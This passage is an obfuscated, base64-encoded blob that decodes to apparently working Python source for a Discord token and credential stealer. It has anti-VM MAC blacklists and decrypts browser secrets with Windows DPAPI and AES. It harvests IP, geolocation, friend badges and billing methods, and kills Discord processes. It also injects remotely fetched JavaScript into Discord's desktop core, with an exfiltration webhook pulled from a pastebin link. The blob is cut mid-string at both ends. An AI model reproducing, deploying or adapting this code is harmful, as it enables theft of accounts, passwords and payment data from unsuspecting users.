jc6M2E6Mjg6NzMnLCAnMDA6MTU6NWQ6MDA6MDA6YzMnLCAnMDA6NTA6NTY6YTA6NDU6MDMnLCAnMTI6OGE6NWM6MmE6NjU6ZDEnLCAnMDA6MjU6OTA6MzY6ZjA6M2InLCAnMDA6MWI6MjE6MTM6MjE6MjYnLCAnNDI6MDE6MGE6OGE6MDA6MjInLCAnMDA6MWI6MjE6MTM6MzI6NTEnLCAnYTY6MjQ6YWE6YWU6ZTY6MTInLCAnMDg6MDA6Mjc6NDU6MTM6MTAnLCAnMDA6MWI6MjE6MTM6MjY6NDQnLCAnM2M6ZWM6ZWY6NDM6ZmU6ZGUnLCAnZDQ6ODE6ZDc6ZWQ6MjU6NTQnLCAnMDA6MjU6OTA6MzY6NjU6MzgnLCAnMDA6MDM6NDc6NjM6OGI6ZGUnLCAnMDA6MTU6NWQ6MDA6MDU6OGQnLCAnMDA6MGM6Mjk6NTI6NTI6NTAnLCAnMDA6NTA6NTY6YjM6NDI6MzMnLCAnM2M6ZWM6ZWY6NDQ6MDE6MGMnLCAnMDY6NzU6OTE6NTk6M2U6MDInLCAnNDI6MDE6MGE6OGE6MDA6MzMnLCAnZWE6ZjY6ZjE6YTI6MzM6NzYnLCAnYWM6MWY6NmI6ZDA6NGQ6OTgnLCAnMWU6NmM6MzQ6OTM6Njg6NjQnLCAnMDA6NTA6NTY6YTA6NjE6YWEnLCAnNDI6MDE6MGE6OTY6MDA6MjInLCAnMDA6NTA6NTY6YjM6MjE6MjknLCAnMDA6MTU6NWQ6MDA6MDA6YjMnLCAnOTY6MmI6ZTk6NDM6OTY6NzYnLCAnYjQ6YTk6NWE6YjE6YzY6ZmQnLCAnZDQ6ODE6ZDc6ODc6MDU6YWInLCAnYWM6MWY6NmI6ZDA6NDk6ODYnLCAnNTI6NTQ6MDA6OGI6YTY6MDgnLCAnMDA6MGM6Mjk6MDU6ZDg6NmUnLCAnMDA6MjM6Y2Q6ZmY6OTQ6ZjAnLCAnMDA6ZTA6NGM6ZDY6ODY6NzcnLCAnM2M6ZWM6ZWY6NDQ6MDE6YWEnLCAnMDA6MTU6NWQ6MjM6NGM6YTMnLCAnMDA6MWI6MjE6MTM6MzM6NTUnLCAnMDA6MTU6NWQ6MDA6MDA6YTQnLCAnMTY6ZWY6MjI6MDQ6YWY6NzYnLCAnMDA6MTU6NWQ6MjM6NGM6YWQnLCAnMWE6NmM6NjI6NjA6M2I6ZjQnLCAnMDA6MTU6NWQ6MDA6MDA6MWQnLCAnMDA6NTA6NTY6YTA6Y2Q6YTgnLCAnMDA6NTA6NTY6YjM6ZmE6MjMnLCAnNTI6NTQ6MDA6YTA6NDE6OTInLCAnMDA6NTA6NTY6YjM6ZjY6NTcnLCAnMDA6ZTA6NGM6NTY6NDI6OTcnLCAnY2E6NGQ6NGI6Y2E6MTg6Y2MnLCAnZjY6YTU6NDE6MzE6YjI6NzgnLCAnZDY6MDM6ZTQ6YWI6Nzc6OGUnLCAnMDA6NTA6NTY6YWU6YjI6YjAnLCAnMDA6NTA6NTY6YjM6OTQ6Y2InLCAnNDI6MDE6MGE6OGU6MDA6MjInLCAnMDA6NTA6NTY6YjM6NGM6YmYnLCAnMDA6NTA6NTY6YjM6MDk6OWUnLCAnMDA6NTA6NTY6YjM6Mzg6ODgnLCAnMDA6NTA6NTY6YTA6ZDA6ZmEnLCAnMDA6NTA6NTY6YjM6OTE6YzgnLCAnM2U6YzE6ZmQ6ZjE6YmY6NzEnLCAnMDA6NTA6NTY6YTA6NmQ6ODYnLCAnMDA6NTA6NTY6YTA6YWY6NzUnLCAnMDA6NTA6NTY6YjM6ZGQ6MDMnLCAnYzI6ZWU6YWY6ZmQ6Mjk6MjEnLCAnMDA6NTA6NTY6YjM6ZWU6ZTEnLCAnMDA6NTA6NTY6YTA6ODQ6ODgnLCAnMDA6MWI6MjE6MTM6MzI6MjAnLCAnM2M6ZWM6ZWY6NDQ6MDA6ZDAnLCAnMDA6NTA6NTY6YWU6ZTU6ZDUnLCAnMDA6NTA6NTY6OTc6ZjY6YzgnLCAnNTI6NTQ6MDA6YWI6ZGU6NTknLCAnMDA6NTA6NTY6YjM6OWU6OWUnLCAnMDA6NTA6NTY6YTA6Mzk6MTgnLCAnMzI6MTE6NGQ6ZDA6NGE6OWUnLCAnMDA6NTA6NTY6YjM6ZDA6YTcnLCAnOTQ6ZGU6ODA6ZGU6MWE6MzUnLCAnMDA6NTA6NTY6YWU6NWQ6ZWEnLCAnMDA6NTA6NTY6YjM6MTQ6NTknLCAnZWE6MDI6NzU6M2M6OTA6OWYnLCAnMDA6ZTA6NGM6NDQ6NzY6NTQnLCAnYWM6MWY6NmI6ZDA6NGQ6ZTQnLCAnNTI6NTQ6MDA6M2I6Nzg6MjQnLCAnMDA6NTA6NTY6YjM6NTA6ZGUnLCAnN2U6MDU6YTM6NjI6OWM6NGQnLCAnNTI6NTQ6MDA6YjM6ZTQ6NzEnLCAnOTA6NDg6OWE6OWQ6ZDU6MjQnLCAnMDA6NTA6NTY6YjM6M2I6YTYnLCAnOTI6NGM6YTg6MjM6ZmM6MmUnLCAnNWE6ZTI6YTY6YTQ6NDQ6ZGInLCAnMDA6NTA6NTY6YWU6NmY6NTQnLCAnNDI6MDE6MGE6OTY6MDA6MzMnLCAnMDA6NTA6NTY6OTc6YTE6ZjgnLCAnNWU6ODY6ZTQ6M2Q6MGQ6ZjYnLCAnMDA6NTA6NTY6YjM6ZWE6ZWUnLCAnM2U6NTM6ODE6Yjc6MDE6MTMnLCAnMDA6NTA6NTY6OTc6ZWM6ZjInLCAnMDA6ZTA6NGM6YjM6NWE6MmEnLCAnMTI6Zjg6ODc6YWI6MTM6ZWMnLCAnMDA6NTA6NTY6YTA6Mzg6MDYnLCAnMmU6NjI6ZTg6NDc6MTQ6NDknLCAnMDA6MGQ6M2E6ZDI6NGY6MWYnLCAnNjA6MDI6OTI6NjY6MTA6NzknLCAnJywgJzAwOjUwOjU2OmEwOmQ3OjM4JywgJ2JlOjAwOmU1OmM1OjBjOmU1JywgJzAwOjUwOjU2OmEwOjU5OjEwJywgJzAwOjUwOjU2OmEwOjA2OjhkJywgJzAwOmUwOjRjOmNiOjYyOjA4JywgJzRlOjgxOjgxOjhlOjIyOjRlJ10KCiAgICBtYWNfYWRkcmVzcyA9IHV1aWQuZ2V0bm9kZSgpCiAgICBpZiBzdHIodXVpZC5VVUlEKGludD1tYWNfYWRkcmVzcykpIGluIEJMQUNLTElTVDE6CiAgICAgICAgb3MuX2V4aXQoMCkKCgogICAgaW5qX3VybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQXlodXV1L2luamVjdGlvbi9tYWluL2luZGV4LmpzIgogICAgICAgIAogICAgREVURUNURUQgPSBGYWxzZQogICAgI2JpciB1Y2FrdGlrIGR1c3R1ayBiaXIgZ2VtaXlkaWsgYmF0dGlrIDooCiAgICBkZWYgZzN0MXAoKToKICAgICAgICBpcCA9ICJOb25lIgogICAgICAgIHRyeToKICAgICAgICAgICAgaXAgPSB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpKS5yZWFkKCkuZGVjb2RlKCkuc3RyaXAoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVybiBpcAoKICAgIHJlcXVpcmVtZW50cyA9IFsKICAgICAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sCiAgICAgICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdLAogICAgXQogICAgZm9yIG1vZGwgaW4gcmVxdWlyZW1lbnRzOgogICAgICAgIHRyeTogX19pbXBvcnRfXyhtb2RsWzBdKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCB7bW9kbFsxXX0iLCBzaGVsbD1UcnVlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCgogICAgaW1wb3J0IHJlcXVlc3RzCiAgICAKICAgIGZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCgogICAgbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCiAgICByb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKICAgIHRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQogICAgVGhyZWFkbGlzdCA9IFtdCgoKICAgIGNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOgogICAgICAgIF9maWVsZHNfID0gWwogICAgICAgICAgICAoJ2NiRGF0YScsIHdpbnR5cGVzLkRXT1JEKSwKICAgICAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpCiAgICAgICAgXQoKICAgIGRlZiBHM3RENHQ0KGJsb2Jfb3V0KToKICAgICAgICBjYkRhdGEgPSBpbnQoYmxvYl9vdXQuY2JEYXRhKQogICAgICAgIHBiRGF0YSA9IGJsb2Jfb3V0LnBiRGF0YQogICAgICAgIGJ1ZmZlciA9IGNfYnVmZmVyKGNiRGF0YSkKICAgICAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLCBwYkRhdGEsIGNiRGF0YSkKICAgICAgICB3aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKHBiRGF0YSkKICAgICAgICByZXR1cm4gYnVmZmVyLnJhdwoKICAgIGRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6CiAgICAgICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkKICAgICAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkKICAgICAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICAgICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpCiAgICAgICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQoKICAgICAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6CiAgICAgICAgICAgIHJldHVybiBHM3RENHQ0KGJsb2Jfb3V0KQoKICAgIGRlZiBEM2tyeXB0VjRsVTMoYnVmZiwgbWFzdGVyX2tleT1Ob25lKToKICAgICAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdCiAgICAgICAgaWYgc3RhcnRzID09ICd2MTAnIG9yIHN0YXJ0cyA9PSAndjExJzoKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCgogICAgZGVmIEwwNGRSM3F1M3NUcyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgICAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cwogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoKICAgICAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOgogICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgdGVsbmV0ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvdmI2MDh0OUQiKS50ZXh0CiAgICBkZWYgTDA0ZHVybDFiKHRlbG5ldCwgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QodGVsbmV0LCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdCh0ZWxuZXQsIGRhdGE9ZGF0YSkpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgZ2xvYmFsSW5mbygpOgogICAgICAgIGlwID0gZzN0MXAoKQogICAgICAgIHVzM3JuNG0xID0gb3MuZ2V0ZW52KCJVU0VSTkFNRSIpCiAgICAgICAgaXBkYXRhbm9qc29uID0gdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve2lwfSIpKS5yZWFkKCkuZGVjb2RlKCkucmVwbGFjZSgnY2FsbGJhY2soJywgJycpLnJlcGxhY2UoJ30pJywgJ30nKQogICAgICAgICMgcHJpbnQoaXBkYXRhbm9qc29uKQogICAgICAgIGlwZGF0YSA9IGpzb24ubG9hZHMoaXBkYXRhbm9qc29uKQogICAgICAgICMgcHJpbnQodXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve2lwfSIpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICAgICAgY29udHJ5ID0gaXBkYXRhWyJjb3VudHJ5X25hbWUiXQogICAgICAgIGNvbnRyeUNvZGUgPSBpcGRhdGFbImNvdW50cnlfY29kZSJdLmxvd2VyKCkKICAgICAgICBzZWhpciA9IGlwZGF0YVsic3RhdGUiXQoKICAgICAgICBnbG9iYWxpbmZvID0gZiI6ZmxhZ197Y29udHJ5Q29kZX06ICAtIGB7dXMzcm40bTEudXBwZXIoKX0gfCB7aXB9ICh7Y29udHJ5fSlgIgogICAgICAgIHJldHVybiBnbG9iYWxpbmZvCgoKICAgIGRlZiBUUjZzdChDMDBrMTMpOgogICAgICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0KICAgICAgICBnbG9iYWwgREVURUNURUQKICAgICAgICBkYXRhID0gc3RyKEMwMGsxMykKICAgICAgICB0aW0gPSByZS5maW5kYWxsKCIuZ29vZ2xlLmNvbSIsIGRhdGEpCiAgICAgICAgIyBwcmludChsZW4odGltKSkKICAgICAgICBpZiBsZW4odGltKSA8IC0xOgogICAgICAgICAgICBERVRFQ1RFRCA9IFRydWUKICAgICAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICAgICAgZWxzZToKICAgICAgICAgICAgREVURUNURUQgPSBGYWxzZQogICAgICAgICAgICByZXR1cm4gREVURUNURUQKICAgICAgICAgICAgCiAgICBkZWYgRzN0VUhRRnIxM25kUyh0MGszbik6CiAgICAgICAgYjRkZzNMaXN0ID0gIFsKICAgICAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1ZlcmlmaWVkX0JvdF9EZXZlbG9wZXInLCAnVmFsdWUnOiAxMzEwNzIsICdFbW9qaSc6ICI8OmRldmVsb3Blcjo4NzQ3NTA4MDg0NzI4MjU5ODY+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8yJywgJ1ZhbHVlJzogMTYzODQsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQmFsYW5jZScsICdWYWx1ZSc6IDI1NiwgJ0Vtb2ppJzogIjw6YmFsYW5jZTo4NzQ3NTA4MDgyNjcyOTI2ODM+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJpbGxpYW5jZScsICdWYWx1ZSc6IDEyOCwgJ0Vtb2ppJzogIjw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzEnLCAnVmFsdWUnOiA4LCAnRW1vamknOiAiPDpidWdodW50ZXJfMTo4NzQ3NTA4MDg0MjY2OTI2NTg+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICdWYWx1ZSc6IDQsICdFbW9qaSc6ICI8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0Rpc2NvcmRfRW1wbG95ZWUnLCAnVmFsdWUnOiAxLCAnRW1vamknOiAiPDpzdGFmZjo4NzQ3NTA4MDg3Mjg2NjYxNTI+ICJ9CiAgICAgICAgXQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogdDBrM24sCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIGZyaWVuZGxpc3QgPSBqc29uLmxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICAgICAgdWhxbGlzdCA9ICcnCiAgICAgICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgICAgICBPd24zZEIzZGc0cyA9ICcnCiAgICAgICAgICAgIGZsYWdzID0gZnJpZW5kWyd1c2VyJ11bJ3B1YmxpY19mbGFncyddCiAgICAgICAgICAgIGZvciBiNGRnMyBpbiBiNGRnM0xpc3Q6CiAgICAgICAgICAgICAgICBpZiBmbGFncyAvLyBiNGRnM1siVmFsdWUiXSAhPSAwIGFuZCBmcmllbmRbJ3R5cGUnXSA9PSAxOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCAiSG91c2UiIGluIGI0ZGczWyJOYW1lIl06CiAgICAgICAgICAgICAgICAgICAgICAgIE93bjNkQjNkZzRzICs9IGI0ZGczWyJFbW9qaSJdCiAgICAgICAgICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGI0ZGczWyJWYWx1ZSJdCiAgICAgICAgICAgIGlmIE93bjNkQjNkZzRzICE9ICcnOgogICAgICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd24zZEIzZGc0c30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiIKICAgICAgICByZXR1cm4gdWhxbGlzdAoKCiAgICBwcm9jZXNzX2xpc3QgPSBvcy5wb3BlbigndGFza2xpc3QnKS5yZWFkbGluZXMoKQoKCiAgICBmb3IgcHJvY2VzcyBpbiBwcm9jZXNzX2xpc3Q6CiAgICAgICAgaWYgIkRpc2NvcmQiIGluIHByb2Nlc3M6CiAgICAgICAgICAgIAogICAgICAgICAgICBwaWQgPSBpbnQocHJvY2Vzcy5zcGxpdCgpWzFdKQogICAgICAgICAgICBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvRiAvUElEIHtwaWR9IikKCiAgICBkZWYgRzN0YjFsbDFuZyh0MGszbik6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICAgICAgfQogICAgICAgIHRyeToKICAgICAgICAgICAgYjFsbDFuZ2pzb24gPSBqc29uLmxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgCiAgICAgICAgaWYgYjFsbDFuZ2pzb24gPT0gW106IHJldHVybiAiYGBgTm9uZWBgYCIKCiAgICAgICAgYjFsbDFuZyA9ICIiCiAgICAgICAgZm9yIG1ldGhvZGUgaW4gYjFsbDFuZ2pzb246CiAgICAgICAgICAgIGlmIG1ldGhvZGVbImludmFsaWQiXSA9PSBGYWxzZToKICAgICAgICAgICAgICAgIGlmIG1ldGhvZGVbInR5cGUiXSA9PSAxOgogICAgICAgICAgICAgICAgICAgIGIxbGwxbmcgKz0gIjpjcmVkaXRfY2FyZDoiCiAgICAgICAgICAgICAgICBlbGlmIG1ldGhvZGVbInR5cGUiXSA9PSAyOgogICAgICAgICAgICAgICAgICAgIGIxbGwxbmcgKz0gIjpwYXJraW5nOiAiCgogICAgICAgIHJldHVybiBiMWxsMW5nCgogICAgZGVmIGlual9kaXNjb3JkKCk6CgogICAgICAgIHVzZXJuYW1lID0gb3MuZ2V0bG9naW4oKQoKICAgICAgICBmb2xkZXJfbGlzdCA9IFsnRGlzY29yZCcsICdEaXNjb3JkQ2FuYXJ5JywgJ0Rpc2NvcmRQVEInLCAnRGlzY29yZERldmVsb3BtZW50J10KCiAgICAgICAgZm9yIGZvbGRlcl9uYW1lIGluIGZvbGRlcl9saXN0OgogICAgICAgICAgICBkZW5lbWVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpLCBmb2xkZXJfbmFtZSkKICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihkZW5lbWVfcGF0aCk6CiAgICAgICAgICAgICAgICBmb3Igc3ViZGlyLCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGRlbmVtZV9wYXRoKToKICAgICAgICAgICAgICAgICAgICBpZiAnYXBwLScgaW4gc3ViZGlyOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZGlyIGluIGRpcnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnbW9kdWxlcycgaW4gZGlyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZHVsZV9wYXRoID0gb3MucGF0aC5qb2luKHN1YmRpciwgZGlyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBzdWJzdWJkaXIsIHN1YmRpcnMsIHN1YmZpbGVzIGluIG9zLndhbGsobW9kdWxlX3BhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnZGlzY29yZF9kZXNrdG9wX2NvcmUtJyBpbiBzdWJzdWJkaXI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3Igc3Vic3Vic3ViZGlyLCBzdWJzdWJkaXJzLCBzdWJzdWJmaWxlcyBpbiBvcy53YWxrKHN1YnN1YmRpcik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2Rpc2NvcmRfZGVza3RvcF9jb3JlJyBpbiBzdWJzdWJzdWJkaXI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIHN1YnN1YmZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZSA9PSAnaW5kZXguanMnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihzdWJzdWJzdWJkaXIsIGZpbGUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlual9jb250ZW50ID0gcmVxdWVzdHMuZ2V0KGlual91cmwpLnRleHQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5qX2NvbnRlbnQgPSBpbmpfY29udGVudC5yZXBsYWNlKCIlV0VCSE9PSyUiLCB0ZWxuZXQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgaW5kZXhfZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXhfZmlsZS53cml0ZShpbmpfY29udGVudCkKICAgIGlual9kaXNjb3JkKCkKCiAgICBkZWYgRzN0QjRkZzMxKGZsYWdzKToKICAgICAgICBpZiBmbGFncyA9PSAwOiByZXR1cm4gJycKCiAgICAgICAgT3duM2RCM2RnNHMgPSAnJwogICAgICAgIGI0ZGczTGlzdCA9ICBbCiAgICAgICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgz